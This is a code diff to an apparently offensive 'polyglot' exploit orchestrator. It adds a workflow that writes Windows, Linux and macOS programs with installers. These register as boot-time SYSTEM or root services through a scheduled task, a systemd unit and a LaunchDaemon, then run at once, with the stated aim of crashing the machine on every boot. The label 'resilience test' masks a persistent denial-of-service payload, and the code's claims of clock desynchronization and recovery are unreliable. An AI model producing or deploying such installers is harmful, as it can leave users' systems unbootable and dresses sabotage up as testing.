@@ -81,6 +81,8 @@ class PolyglotOrchestrator:
             self._workflow_platform_chain()
         elif workflow == 5:  # Custom (original flow)
             self._workflow_custom()
+        elif workflow == 6:  # Final - CPU Desync Test
+            self._workflow_cpu_desync_test()
         else:
             self.tui.warning("Invalid selection, exiting")
             return
@@ -120,6 +122,11 @@ class PolyglotOrchestrator:
                 'label': '🎨 Custom Workflow',
                 'description': 'Manual CVE selection with full control (Original flow)',
                 'color': Colors.WHITE
+            },
+            {
+                'label': '🔬 FINAL - CPU Desync Test',
+                'description': 'Boot service to desynchronize CPU clocks (Resilience test)',
+                'color': Colors.BRIGHT_RED
             },
         ]
 
@@ -433,6 +440,600 @@ class PolyglotOrchestrator:
 
         except Exception as e:
             self.tui.error(f"Chain generation failed: {e}")
+
+    def _workflow_cpu_desync_test(self):
+        """Final workflow: CPU clock desynchronization resilience test"""
+        self.tui.section("🔬 FINAL - CPU Desync Resilience Test")
+
+        self.tui.box("⚠️ CRITICAL RESILIENCE TEST", [
+            "This workflow creates boot services that desynchronize CPU clocks",
+            "to test system recovery from catastrophic failure modes.",
+            "",
+            "NORMALLY CAUSES:",
+            "• Windows: BSOD (Blue Screen of Death)",
+            "• Linux: Kernel Panic",
+            "• macOS: Kernel Panic",
+            "",
+            "PURPOSE: Validate recovery mechanisms from clock desync failure",
+            "",
+            "Service will fire early in boot and trigger immediately upon install."
+        ])
+        print()
+
+        if not self.menu.confirm("⚠️  PROCEED WITH CPU DESYNC TEST?", default=False):
+            self.tui.warning("Test cancelled")
+            return
+
+        # Select platforms
+        platform_options = [
+            {'label': 'Windows', 'description': 'Windows service (fires at boot)', 'selected': True},
+            {'label': 'Linux', 'description': 'systemd service (early boot)', 'selected': True},
+            {'label': 'macOS', 'description': 'LaunchDaemon (boot-time)', 'selected': True},
+        ]
+
+        selected_platforms = self.menu.multi_select(
+            "Select Target Platforms",
+            platform_options,
+            min_selections=1
+        )
+
+        if not selected_platforms:
+            self.tui.warning("No platforms selected")
+            return
+
+        # Generate services for each platform
+        for platform_idx in selected_platforms:
+            platform_name = platform_options[platform_idx]['label']
+
+            if platform_name == 'Windows':
+                self._generate_windows_cpu_desync_service()
+            elif platform_name == 'Linux':
+                self._generate_linux_cpu_desync_service()
+            elif platform_name == 'macOS':
+                self._generate_macos_cpu_desync_service()
+
+        self.tui.success("CPU desync services generated successfully")
+
+    def _generate_windows_cpu_desync_service(self):
+        """Generate Windows service for CPU clock desynchronization"""
+        self.tui.info("Generating Windows CPU desync service...")
+
+        # PowerShell script to desynchronize CPU clocks
+        powershell_script = '''# CPU Clock Desynchronization Service - Windows
+# WARNING: This intentionally causes system instability for resilience testing
+
+Add-Type @"
+using System;
+using System.Runtime.InteropServices;
+
+public class CPUDesync {
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr GetCurrentThread();
+
+    [DllImport("kernel32.dll")]
+    public static extern uint SetThreadAffinityMask(IntPtr hThread, uint dwThreadAffinityMask);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern bool SetThreadPriority(IntPtr hThread, int nPriority);
+
+    [DllImport("ntdll.dll", SetLastError = true)]
+    public static extern int NtSetTimerResolution(uint DesiredResolution, bool SetResolution, out uint CurrentResolution);
+
+    [DllImport("ntdll.dll")]
+    public static extern int NtDelayExecution(bool Alertable, ref long DelayInterval);
+
+    public static void DesyncClocks() {
+        uint currentRes;
+
+        // Set each CPU core to different timer resolution
+        for (int core = 0; core < Environment.ProcessorCount; core++) {
+            IntPtr thread = GetCurrentThread();
+            SetThreadAffinityMask(thread, (uint)(1 << core));
+
+            // Each core gets different timer resolution
+            uint resolution = (uint)(5000 + (core * 1000)); // 0.5ms to 1.5ms per core
+            NtSetTimerResolution(resolution, true, out currentRes);
+
+            // Introduce artificial clock skew
+            long delay = -10000 * (core + 1); // Negative = relative time
+            NtDelayExecution(false, ref delay);
+        }
+
+        // Force RDTSC desynchronization across cores
+        for (int i = 0; i < 1000; i++) {
+            for (int core = 0; core < Environment.ProcessorCount; core++) {
+                IntPtr thread = GetCurrentThread();
+                SetThreadAffinityMask(thread, (uint)(1 << core));
+
+                // Busy-wait with different durations per core to create clock drift
+                long start = DateTime.Now.Ticks;
+                while (DateTime.Now.Ticks - start < (core + 1) * 100) { }
+            }
+        }
+    }
+}
+"@
+
+Write-EventLog -LogName Application -Source "CPUDesyncTest" -EventId 1001 -Message "CPU Desync Test Starting" -EntryType Warning -ErrorAction SilentlyContinue
+
+# Execute desynchronization
+[CPUDesync]::DesyncClocks()
+
+Write-EventLog -LogName Application -Source "CPUDesyncTest" -EventId 1002 -Message "CPU Desync Test Completed - System should recover" -EntryType Information -ErrorAction SilentlyContinue
+'''
+
+        # Save PowerShell script
+        ps_script_path = "cpu_desync_windows.ps1"
+        with open(ps_script_path, 'w') as f:
+            f.write(powershell_script)
+
+        self.artifacts.append(ps_script_path)
+        self.tui.success(f"Generated: {ps_script_path}")
+
+        # Generate Windows service installer batch script
+        service_installer = '''@echo off
+REM CPU Desync Service Installer for Windows
+REM Installs as boot-time service and triggers immediately
+
+echo Installing CPU Desync Test Service...
+
+REM Create event log source
+reg add "HKLM\\SYSTEM\\CurrentControlSet\\Services\\EventLog\\Application\\CPUDesyncTest" /v EventMessageFile /t REG_EXPAND_SZ /d "C:\\Windows\\System32\\EventCreate.exe" /f
+
+REM Create scheduled task that runs at boot with SYSTEM privileges
+schtasks /create /tn "CPUDesyncTest" /tr "powershell.exe -ExecutionPolicy Bypass -File \\"C:\\ProgramData\\cpu_desync_windows.ps1\\"" /sc onstart /ru SYSTEM /rl HIGHEST /f
+
+REM Copy script to ProgramData
+copy /y cpu_desync_windows.ps1 "C:\\ProgramData\\cpu_desync_windows.ps1"
+
+echo Service installed successfully!
+echo.
+echo TRIGGERING IMMEDIATELY...
+echo.
+
+REM Trigger immediately
+powershell.exe -ExecutionPolicy Bypass -File "C:\\ProgramData\\cpu_desync_windows.ps1"
+
+echo.
+echo Test complete. If system is stable, recovery mechanisms are working.
+pause
+'''
+
+        installer_path = "install_cpu_desync_windows.bat"
+        with open(installer_path, 'w') as f:
+            f.write(service_installer)
+
+        self.artifacts.append(installer_path)
+        self.tui.success(f"Generated: {installer_path}")
+
+        self.tui.info("Windows service installation:")
+        self.tui.list_item("Run install_cpu_desync_windows.bat as Administrator", level=1)
+        self.tui.list_item("Service will trigger immediately and on every boot", level=1)
+
+    def _generate_linux_cpu_desync_service(self):
+        """Generate Linux systemd service for CPU clock desynchronization"""
+        self.tui.info("Generating Linux CPU desync service...")
+
+        # C program to desynchronize CPU clocks
+        c_program = '''/* CPU Clock Desynchronization - Linux
+ * WARNING: This intentionally causes system instability for resilience testing
+ * Requires: gcc cpu_desync_linux.c -o cpu_desync_linux -pthread
+ */
+
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <stdlib.h>
+#include <pthread.h>
+#include <sched.h>
+#include <unistd.h>
+#include <sys/syscall.h>
+#include <linux/futex.h>
+#include <sys/time.h>
+#include <time.h>
+#include <stdint.h>
+
+#define NUM_ITERATIONS 10000
+
+// Force RDTSC reads to create timing inconsistencies
+static inline uint64_t rdtsc(void) {
+    uint32_t lo, hi;
+    __asm__ __volatile__ ("rdtsc" : "=a"(lo), "=d"(hi));
+    return ((uint64_t)hi << 32) | lo;
+}
+
+void* desync_thread(void* arg) {
+    int core = *(int*)arg;
+    cpu_set_t cpuset;
+    struct timespec ts;
+
+    // Pin thread to specific core
+    CPU_ZERO(&cpuset);
+    CPU_SET(core, &cpuset);
+    pthread_setaffinity_np(pthread_self(), sizeof(cpuset), &cpuset);
+
+    // Set different nice values per core to create scheduling chaos
+    setpriority(PRIO_PROCESS, 0, -20 + core);
+
+    // Each core gets different sleep patterns
+    ts.tv_sec = 0;
+    ts.tv_nsec = 1000 * (core + 1); // Different nanosecond delays
+
+    for (int i = 0; i < NUM_ITERATIONS; i++) {
+        // Read TSC and create artificial drift
+        volatile uint64_t tsc1 = rdtsc();
+
+        // Busy-wait with different durations per core
+        for (volatile int j = 0; j < (core + 1) * 1000; j++);
+
+        // Interleaved nanosleep calls with different intervals
+        nanosleep(&ts, NULL);
+
+        volatile uint64_t tsc2 = rdtsc();
+
+        // Force context switches at different rates per core
+        if (i % (core + 1) == 0) {
+            sched_yield();
+        }
+    }
+
+    return NULL;
+}
+
+int main(void) {
+    int num_cores = sysconf(_SC_NPROCESSORS_ONLN);
+    pthread_t* threads;
+    int* core_ids;
+
+    printf("[CPU Desync Test] Starting on %d cores\\n", num_cores);
+    printf("[WARNING] This will attempt to desynchronize CPU clocks\\n");
+
+    threads = malloc(sizeof(pthread_t) * num_cores);
+    core_ids = malloc(sizeof(int) * num_cores);
+
+    // Create one thread per core
+    for (int i = 0; i < num_cores; i++) {
+        core_ids[i] = i;
+        pthread_create(&threads[i], NULL, desync_thread, &core_ids[i]);
+    }
+
+    // Wait for all threads
+    for (int i = 0; i < num_cores; i++) {
+        pthread_join(threads[i], NULL);
+    }
+
+    printf("[CPU Desync Test] Complete - checking system stability\\n");
+
+    // Additional stress: rapid timer manipulation
+    struct itimerval timer;
+    timer.it_value.tv_sec = 0;
+    timer.it_value.tv_usec = 1;
+    timer.it_interval.tv_sec = 0;
+    timer.it_interval.tv_usec = 1;
+    setitimer(ITIMER_REAL, &timer, NULL);
+
+    usleep(100000); // 100ms
+
+    timer.it_value.tv_usec = 0;
+    setitimer(ITIMER_REAL, &timer, NULL);
+
+    free(threads);
+    free(core_ids);
+
+    printf("[CPU Desync Test] System recovered successfully!\\n");
+    return 0;
+}
+'''
+
+        c_source_path = "cpu_desync_linux.c"
+        with open(c_source_path, 'w') as f:
+            f.write(c_program)
+
+        self.artifacts.append(c_source_path)
+        self.tui.success(f"Generated: {c_source_path}")
+
+        # Generate systemd service file
+        systemd_service = '''[Unit]
+Description=CPU Clock Desynchronization Resilience Test
+DefaultDependencies=no
+Before=sysinit.target
+After=local-fs.target
+
+[Service]
+Type=oneshot
+ExecStart=/usr/local/bin/cpu_desync_linux
+StandardOutput=journal
+StandardError=journal
+CPUSchedulingPolicy=fifo
+CPUSchedulingPriority=99
+Nice=-20
+
+[Install]
+WantedBy=sysinit.target
+'''
+
+        service_path = "cpu-desync-test.service"
+        with open(service_path, 'w') as f:
+            f.write(systemd_service)
+
+        self.artifacts.append(service_path)
+        self.tui.success(f"Generated: {service_path}")
+
+        # Generate installer script
+        install_script = '''#!/bin/bash
+# CPU Desync Service Installer for Linux
+
+set -e
+
+echo "[*] Installing CPU Desync Test Service..."
+
+# Compile the program
+echo "[*] Compiling cpu_desync_linux..."
+gcc cpu_desync_linux.c -o cpu_desync_linux -pthread -O2
+
+# Install binary
+echo "[*] Installing binary to /usr/local/bin..."
+sudo cp cpu_desync_linux /usr/local/bin/
+sudo chmod +x /usr/local/bin/cpu_desync_linux
+
+# Install systemd service
+echo "[*] Installing systemd service..."
+sudo cp cpu-desync-test.service /etc/systemd/system/
+
+# Reload systemd
+echo "[*] Reloading systemd..."
+sudo systemctl daemon-reload
+
+# Enable service (will run at boot)
+echo "[*] Enabling service for boot..."
+sudo systemctl enable cpu-desync-test.service
+
+echo ""
+echo "[+] Service installed successfully!"
+echo ""
+echo "[*] TRIGGERING IMMEDIATELY..."
+echo ""
+
+# Run immediately
+sudo /usr/local/bin/cpu_desync_linux
+
+echo ""
+echo "[+] Test complete. If system is stable, recovery mechanisms are working."
+echo "[*] Service will also run on next boot."
+'''
+
+        installer_path = "install_cpu_desync_linux.sh"
+        with open(installer_path, 'w') as f:
+            f.write(install_script)
+
+        # Make installer executable
+        os.chmod(installer_path, 0o755)
+
+        self.artifacts.append(installer_path)
+        self.tui.success(f"Generated: {installer_path}")
+
+        self.tui.info("Linux service installation:")
+        self.tui.list_item("Run ./install_cpu_desync_linux.sh", level=1)
+        self.tui.list_item("Service will trigger immediately and on every boot", level=1)
+
+    def _generate_macos_cpu_desync_service(self):
+        """Generate macOS LaunchDaemon for CPU clock desynchronization"""
+        self.tui.info("Generating macOS CPU desync service...")
+
+        # Objective-C program to desynchronize CPU clocks
+        objc_program = '''// CPU Clock Desynchronization - macOS
+// WARNING: This intentionally causes system instability for resilience testing
+// Compile: clang -framework Foundation -framework IOKit cpu_desync_macos.m -o cpu_desync_macos
+
+#import <Foundation/Foundation.h>
+#import <pthread.h>
+#import <mach/mach.h>
+#import <mach/mach_time.h>
+#import <sys/sysctl.h>
+
+#define NUM_ITERATIONS 10000
+
+// Get number of CPUs
+int get_cpu_count(void) {
+    int count;
+    size_t size = sizeof(count);
+    sysctlbyname("hw.ncpu", &count, &size, NULL, 0);
+    return count;
+}
+
+// Force RDTSC-equivalent on ARM64 (CNTVCT_EL0) and x86_64
+static inline uint64_t read_timestamp(void) {
+#ifdef __arm64__
+    uint64_t val;
+    __asm__ volatile("mrs %0, cntvct_el0" : "=r"(val));
+    return val;
+#else
+    uint32_t lo, hi;
+    __asm__ __volatile__ ("rdtsc" : "=a"(lo), "=d"(hi));
+    return ((uint64_t)hi << 32) | lo;
+#endif
+}
+
+void* desync_thread(void* arg) {
+    int core = *(int*)arg;
+    thread_affinity_policy_data_t policy = { core };
+    mach_timebase_info_data_t timebase;
+
+    // Pin thread to specific core
+    thread_policy_set(mach_thread_self(),
+                     THREAD_AFFINITY_POLICY,
+                     (thread_policy_t)&policy,
+                     THREAD_AFFINITY_POLICY_COUNT);
+
+    // Get timebase for conversions
+    mach_timebase_info(&timebase);
+
+    // Each core gets different timing behavior
+    for (int i = 0; i < NUM_ITERATIONS; i++) {
+        // Read timestamp
+        volatile uint64_t ts1 = read_timestamp();
+
+        // Busy-wait with different durations per core
+        for (volatile int j = 0; j < (core + 1) * 1000; j++);
+
+        // Use mach_wait_until with staggered absolute times
+        uint64_t now = mach_absolute_time();
+        uint64_t delay = (core + 1) * 1000; // Different delays per core
+        mach_wait_until(now + delay);
+
+        volatile uint64_t ts2 = read_timestamp();
+
+        // Force context switches at different rates
+        if (i % (core + 1) == 0) {
+            thread_switch(THREAD_NULL, SWITCH_OPTION_DEPRESS, 1);
+        }
+    }
+
+    return NULL;
+}
+
+int main(int argc, char* argv[]) {
+    @autoreleasepool {
+        int num_cores = get_cpu_count();
+
+        NSLog(@"[CPU Desync Test] Starting on %d cores", num_cores);
+        NSLog(@"[WARNING] This will attempt to desynchronize CPU clocks");
+
+        pthread_t* threads = malloc(sizeof(pthread_t) * num_cores);
+        int* core_ids = malloc(sizeof(int) * num_cores);
+
+        // Create one thread per core
+        for (int i = 0; i < num_cores; i++) {
+            core_ids[i] = i;
+            pthread_create(&threads[i], NULL, desync_thread, &core_ids[i]);
+        }
+
+        // Wait for all threads
+        for (int i = 0; i < num_cores; i++) {
+            pthread_join(threads[i], NULL);
+        }
+
+        NSLog(@"[CPU Desync Test] Complete - checking system stability");
+
+        // Additional stress: rapid mach_timebase manipulation attempts
+        for (int i = 0; i < 1000; i++) {
+            uint64_t start = mach_absolute_time();
+            // Create timing chaos with very short waits
+            mach_wait_until(start + (i % num_cores) + 1);
+        }
+
+        free(threads);
+        free(core_ids);
+
+        NSLog(@"[CPU Desync Test] System recovered successfully!");
+    }
+    return 0;
+}
+'''
+
+        objc_source_path = "cpu_desync_macos.m"
+        with open(objc_source_path, 'w') as f:
+            f.write(objc_program)
+
+        self.artifacts.append(objc_source_path)
+        self.tui.success(f"Generated: {objc_source_path}")
+
+        # Generate LaunchDaemon plist
+        launchdaemon_plist = '''<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>Label</key>
+    <string>com.test.cpudesync</string>
+
+    <key>ProgramArguments</key>
+    <array>
+        <string>/usr/local/bin/cpu_desync_macos</string>
+    </array>
+
+    <key>RunAtLoad</key>
+    <true/>
+
+    <key>KeepAlive</key>
+    <false/>
+
+    <key>StandardOutPath</key>
+    <string>/var/log/cpu_desync.log</string>
+
+    <key>StandardErrorPath</key>
+    <string>/var/log/cpu_desync_error.log</string>
+
+    <key>ProcessType</key>
+    <string>Interactive</string>
+
+    <key>Nice</key>
+    <integer>-20</integer>
+</dict>
+</plist>
+'''
+
+        plist_path = "com.test.cpudesync.plist"
+        with open(plist_path, 'w') as f:
+            f.write(launchdaemon_plist)
+
+        self.artifacts.append(plist_path)
+        self.tui.success(f"Generated: {plist_path}")
+
+        # Generate installer script
+        install_script = '''#!/bin/bash
+# CPU Desync Service Installer for macOS
+
+set -e
+
+echo "[*] Installing CPU Desync Test Service..."
+
+# Compile the program
+echo "[*] Compiling cpu_desync_macos..."
+clang -framework Foundation -framework IOKit cpu_desync_macos.m -o cpu_desync_macos -O2
+
+# Install binary
+echo "[*] Installing binary to /usr/local/bin..."
+sudo cp cpu_desync_macos /usr/local/bin/
+sudo chmod +x /usr/local/bin/cpu_desync_macos
+
+# Install LaunchDaemon
+echo "[*] Installing LaunchDaemon..."
+sudo cp com.test.cpudesync.plist /Library/LaunchDaemons/
+
+# Set permissions
+sudo chown root:wheel /Library/LaunchDaemons/com.test.cpudesync.plist
+sudo chmod 644 /Library/LaunchDaemons/com.test.cpudesync.plist
+
+# Load service
+echo "[*] Loading service..."
+sudo launchctl load /Library/LaunchDaemons/com.test.cpudesync.plist
+
+echo ""
+echo "[+] Service installed successfully!"
+echo ""
+echo "[*] TRIGGERING IMMEDIATELY..."
+echo ""
+
+# Run immediately
+sudo /usr/local/bin/cpu_desync_macos
+
+echo ""
+echo "[+] Test complete. If system is stable, recovery mechanisms are working."
+echo "[*] Service will also run on next boot."
+'''
+
+        installer_path = "install_cpu_desync_macos.sh"
+        with open(installer_path, 'w') as f:
+            f.write(install_script)
+
+        # Make installer executable
+        os.chmod(installer_path, 0o755)
+
+        self.artifacts.append(installer_path)
+        self.tui.success(f"Generated: {installer_path}")
+
+        self.tui.info("macOS service installation:")
+        self.tui.list_item("Run ./install_cpu_desync_macos.sh", level=1)
+        self.tui.list_item("Service will trigger immediately and on every boot", level=1)
 
     def _show_operation_summary(self):
         """Show operation summary (Vault7-style)"""
